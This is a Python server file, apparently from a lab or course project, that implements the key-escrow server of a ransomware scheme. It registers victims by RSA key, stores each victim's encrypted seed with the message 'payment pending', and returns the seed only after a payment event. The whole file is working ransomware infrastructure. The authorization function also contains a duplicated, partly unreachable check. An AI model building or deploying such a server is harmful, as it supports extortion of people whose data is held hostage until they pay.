
import base64
import binascii
import json
import socket
from pathlib import Path

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

from compartido.autenticacion import verificar_registro_victima
from compartido.confianza import verificar_identidad_autorizada
from compartido.protocolo import enviar_mensaje, recibir_mensaje

from servidor.almacenamiento import (
    preparar_servidor,
    registrar_identidad,
    guardar_semilla,
    cargar_semilla,
    marcar_pago,
    obtener_pkV,
)
from servidor.firmas_servidor import (
    preparar_firmas_servidor,
    firmar_respuesta_registro,
)


HOST = "127.0.0.1"
PUERTO = 5000
CARPETA_SERVIDOR = Path("datos_privados/servidor")


def _oaep():
    return padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None,
    )


def comprobar_autorizacion(mensaje, carpeta, obligatoria=False):
    if not obligatoria:
        return True

    ruta = Path(carpeta) / "identidades_autorizadas.json"
    if not ruta.exists():
        raise ValueError("No existe la lista de identidades autorizadas")
        
    ruta = Path(carpeta) / "identidades_autorizadas.json"
    if not ruta.exists():
        if obligatoria:
            raise ValueError("No existe la lista de identidades autorizadas")
        return True

    try:
        autorizaciones = json.loads(ruta.read_text(encoding="utf-8"))
    except (ValueError, OSError) as error:
        raise ValueError("No se pudo cargar la lista de autorizaciones") from error

    if not isinstance(autorizaciones, dict):
        raise ValueError("Lista de autorizaciones invalida")

    id_victima = mensaje.get("idV")
    clave_confiable_b64 = autorizaciones.get(id_victima)
    if not isinstance(clave_confiable_b64, str):
        raise ValueError("Identidad no autorizada")

    try:
        clave_confiable_pem = base64.b64decode(clave_confiable_b64, validate=True)
    except (ValueError, binascii.Error) as error:
        raise ValueError("Clave autorizada mal codificada") from error

    return verificar_identidad_autorizada(mensaje, id_victima, clave_confiable_pem)


def procesar_registro(mensaje, identidad_servidor, carpeta_registros=None, exigir_autorizacion=False):
    if not isinstance(mensaje, dict) or mensaje.get("tipo") != "registro":
        raise ValueError("Tipo de mensaje no admitido")

    id_victima = mensaje.get("idV")
    clave_b64 = mensaje.get("pkV")

    if not isinstance(id_victima, str) or not id_victima or len(id_victima) > 128:
        raise ValueError("Identificador invalido")
    if not isinstance(clave_b64, str):
        raise ValueError("Clave publica ausente")

    try:
        datos_clave = base64.b64decode(clave_b64, validate=True)
        clave_victima = serialization.load_pem_public_key(datos_clave)
    except (ValueError, binascii.Error) as error:
        raise ValueError("Clave publica invalida") from error

    if not isinstance(clave_victima, rsa.RSAPublicKey) or clave_victima.key_size < 2048:
        raise ValueError("La clave RSA es demasiado corta o no es RSA")

    firma_b64 = mensaje.get("firmaV")
    if not isinstance(firma_b64, str) or not firma_b64:
        raise ValueError("Falta firma de la victima")

    try:
        firma = base64.b64decode(firma_b64, validate=True)
    except (ValueError, binascii.Error) as error:
        raise ValueError("Firma de la victima mal codificada") from error

    if not verificar_registro_victima(clave_victima, id_victima, clave_b64, firma):
        raise ValueError("Firma de la victima invalida")

    carpeta = Path(carpeta_registros) if carpeta_registros is not None else CARPETA_SERVIDOR
    comprobar_autorizacion(mensaje, carpeta, obligatoria=exigir_autorizacion)
    registrar_identidad(id_victima, clave_b64, carpeta)

    clave_servidor_pem = identidad_servidor["publica"].public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    respuesta = {
        "tipo": "registro_ok",
        "idV": id_victima,
        "pkS": base64.b64encode(clave_servidor_pem).decode("ascii"),
    }

    claves_firma = preparar_firmas_servidor(carpeta)
    return firmar_respuesta_registro(respuesta, claves_firma["privada"])


def procesar_entrega_semilla(mensaje, identidad_servidor, carpeta=CARPETA_SERVIDOR):
    if mensaje.get("tipo") != "entrega_semilla":
        raise ValueError("Tipo incorrecto")

    id_victima = mensaje.get("idV")
    cifrado_b64 = mensaje.get("semilla_cifrada")

    if not isinstance(id_victima, str) or not id_victima:
        raise ValueError("Identificador invalido")
    if not isinstance(cifrado_b64, str):
        raise ValueError("Falta semilla_cifrada")

    try:
        obtener_pkV(id_victima, carpeta)
    except KeyError:
        raise ValueError("Victima no registrada")

    try:
        cifrado = base64.b64decode(cifrado_b64, validate=True)
        semilla = identidad_servidor["privada"].decrypt(cifrado, _oaep())
    except Exception as error:
        raise ValueError(f"No se pudo descifrar la semilla: {error}") from error

    if len(semilla) != 32:
        raise ValueError("Semilla de longitud incorrecta")

    guardar_semilla(id_victima, semilla, carpeta)

    return {
        "tipo": "confirmacion_semilla",
        "idV": id_victima,
        "mensaje": "Semilla recibida y almacenada. Pago pendiente.",
    }


def procesar_solicitud_recuperacion(mensaje, identidad_servidor, carpeta=CARPETA_SERVIDOR):
    if mensaje.get("tipo") != "solicitud_recuperacion":
        raise ValueError("Tipo incorrecto")

    id_victima = mensaje.get("idV")
    evento = mensaje.get("evento")

    if not isinstance(id_victima, str) or not id_victima:
        raise ValueError("Identificador invalido")
    if evento != "pago":
        raise ValueError("Solo se admite el evento de pago")

    try:
        semilla, estado = cargar_semilla(id_victima, carpeta)
        pkV_b64 = obtener_pkV(id_victima, carpeta)
    except KeyError as error:
        raise ValueError(str(error)) from error

    marcar_pago(id_victima, carpeta)

    pkV = serialization.load_pem_public_key(base64.b64decode(pkV_b64, validate=True))
    if not isinstance(pkV, rsa.RSAPublicKey):
        raise ValueError("pkV registrada no es RSA")

    cifrado = pkV.encrypt(semilla, _oaep())

    return {
        "tipo": "recuperacion_ok",
        "idV": id_victima,
        "semilla_cifrada": base64.b64encode(cifrado).decode("ascii"),
        "mensaje": "Pago registrado. Semilla devuelta.",
    }


def procesar_mensaje(mensaje, identidad_servidor, exigir_autorizacion=False):
    tipo = mensaje.get("tipo")
    if tipo == "registro":
        return procesar_registro(
            mensaje, identidad_servidor, exigir_autorizacion=exigir_autorizacion
        )
    if tipo == "entrega_semilla":
        return procesar_entrega_semilla(mensaje, identidad_servidor)
    if tipo == "solicitud_recuperacion":
        return procesar_solicitud_recuperacion(mensaje, identidad_servidor)
    raise ValueError(f"Tipo de mensaje desconocido: {tipo}")


def iniciar_servidor(exigir_autorizacion=True):
    identidad = preparar_servidor()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as escucha:
        escucha.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        escucha.bind((HOST, PUERTO))
        escucha.listen(5)

        print("=== SERVIDOR DE CRIPTOGRAFIA (Modelo B) ===")
        print(f"Escuchando en {HOST}:{PUERTO}")
        print("Mensajes: registro | entrega_semilla | solicitud_recuperacion")
        modo = "ESTRICTO (requiere autorizacion)" if exigir_autorizacion else "LABORATORIO"
        print(f"Modo: {modo}")
        print("Ctrl+C para detener\n")

        while True:
            conexion, addr = escucha.accept()
            with conexion:
                conexion.settimeout(10)
                try:
                    mensaje = recibir_mensaje(conexion)
                    tipo = mensaje.get("tipo", "?")
                    idv = mensaje.get("idV", "?")
                    print(f"[>] {tipo}  idV={idv}  desde {addr}")

                    respuesta = procesar_mensaje(
                        mensaje, identidad, exigir_autorizacion=exigir_autorizacion
                    )
                    enviar_mensaje(conexion, respuesta)
                    print(f"[<] {respuesta.get('tipo')}  idV={respuesta.get('idV')}\n")

                except (ValueError, OSError, ConnectionError, KeyError) as error:
                    print(f"[!] Rechazado: {error}\n")
                    try:
                        enviar_mensaje(
                            conexion, {"tipo": "error", "mensaje": str(error)}
                        )
                    except OSError:
                        pass


if __name__ == "__main__":
    import sys
    lab = "--lab" in sys.argv
    try:
        iniciar_servidor(exigir_autorizacion=not lab)
    except KeyboardInterrupt:
        print("\nServidor detenido.")